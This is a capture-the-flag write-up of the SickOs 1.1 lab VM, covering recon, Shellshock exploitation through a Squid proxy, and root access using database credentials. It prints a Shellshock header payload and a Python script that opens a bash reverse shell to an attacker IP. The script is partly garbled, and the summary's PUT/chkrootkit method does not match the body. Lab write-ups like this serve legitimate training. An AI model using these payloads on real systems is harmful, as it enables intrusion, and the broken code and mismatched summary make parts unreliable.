---
title: Sickos 1
author: ssanjua
datetime: 2024-09-23T17:00:12.000+00:00
slug: SickOS 1 - Vulnhub
featured: true
tags:
  - Vulnhub
  - Privilege-scalation
  - Medium
description:
  This is a Linux box that involved exploiting the PUT http method to upload a PHP script through which a reverse shell can be obtained, and then using a known vulnerability in the chkrootkit program to escalate to root.
---

- **Name**: SickOs: 1.1
- **Date release**: 11 Dec 2015
- **Author**: [D4rk](https://www.vulnhub.com/author/d4rk,199/)
- **Series**: [SickOs](https://www.vulnhub.com/series/sickos,70/)
- 
## Description

This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them

## About Release

Name........: SickOs1.1
Date Release: 11 Dec 2015
Author......: D4rk
Series......: SickOs
Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt
Tester(s)...: h1tch1
Twitter.....: https://twitter.com/D4rk36

---
## Recognition

First we try to recognize the IP of our target with arp-scan.

```bash
sudo arp-scan -I eth0 --localnet --ignoredups
```

![Descripción](../../assets/img-content/sickOs(1).png)

Our target is `192.168.128.132` we proceed to do an nmap scan to see what ports it has open and we discover port **22** and **3128**.

```bash
nmap -p- --open -sT -vvv --min-rate 5000 -n -Pn 192.168.128.132 -oG allPorts
```

Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
3128/tcp open  squid-http syn-ack

Data we extract from the reconnaissance: 
- Squid-http syn-ack
- Filtered ports

![Descripción](../../assets/img-content/sickOs(2).png)

Lets do some research **Server Squid**:

Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages. Squid has extensive access controls and makes a great server accelerator. It runs on most available operating systems, including Windows and is licensed under the GNU GPL. [Definicion web](https://www.squid-cache.org/)

So we know that what the port is doing is serving as a proxy, so we can think that a server is running on port 80 and is using Squid as a proxy:

We try to curl the ip by brokering a proxy through port **3128** which is the open port through the Squid proxy server.

![Descripción](../../assets/img-content/sickOs(4).png)

![Descripción](../../assets/img-content/sickOs(5).png)

![Descripción](../../assets/img-content/sickOs(6).png)

Ahora podemos intentar listar directorios usando el proxy.

![Descripción](../../assets/img-content/sickOs(7).png)

Now we can try to list directories using the proxy.

![Description](../../assets/img-content/sickOs(7).png)

When we discover a **cgi-bin** directory we are alerted because we know that if it exists we are probably in the presence of a **Shell Shock** [ShellShock - CGI](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)

Let's see if we get anything else from this dir:

![Description](../../assets/img-content/sickOs(10).png)
![Description](../../assets/img-content/sickOs(9).png)

We searched the web for more information about **Shell Shock** and found an old article [Shell Shock](https://blog.cloudflare.com/inside-shellshock/)

>For example, if example.com was vulnerable then

```bash
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```

We try changing the instruction, using only the header of the example:

![Description](../../assets/img-content/sickOs(11).png)

Effectively we have command execution, so let's try to get a **Reverse shell** through a python script:

```python
#!/user/bin/python3
    
 import sys, signal, requests
 import threading
from pwn import *

def def_handler(sig, frame):
	print("\n[!] - exiting... \n")
	sys.exit(1)
	signal.signal(signal.SIGINT, def_handler)
	main_url = "http://192.168.128.132/cgi-bin/status"
	squid_proxy = {"http": "http://192.168.128.132:3128"}

def shellshock_attack():
	headers = {'User-Agent': "() { :; };
	echo; /bin/bash -c '/bin/bash -i dev/tcp/192.168.128.131/443 0>&1'"}
	r = requests.get(main_url, headers=headers, proxies=squid_proxy) 

if __name__ == '__main__':
	try:
		threading.Thread(target=shellshock_attack, args()).start()
	except Exception as e:
		log.error(str(e))
```

We execute while listening on the port we chose in the script:

![Description](../../assets/img-content/sickOs(22).png)

We made it, we are inside the victim machine and we can execute commands, now we have to escalate our privilege.

We explore and find an interesting info inside the config.php in /var/www/wolfcms (that was in the robots.txt but I decided not to explore that way)

Inside this file are the credentials to authenticate to the database, we have the *User* and *Password* that we can use to try to escalate privileges on the machine.

- User: 'root'
- Password: 'john@123'


![Descripción](../../assets/img-content/sickOs(17).png)

The shell is old so if you google the following output you are advised to update the shell.

![Description](../../assets/img-content/sickOs(18).png)

We update and try to authenticate with the credentials found:

```python
python -c 'import pty;pty.spawn(“/bin/bash”)'
```

![Description](../../assets/img-content/sickOs(19).png)

It worked, we tried again and.... 

![Description](../../assets/img-content/sickOs(20).png)

We are now **root**.

![Description](../../assets/img-content/sickOs(21).png)

Flag found!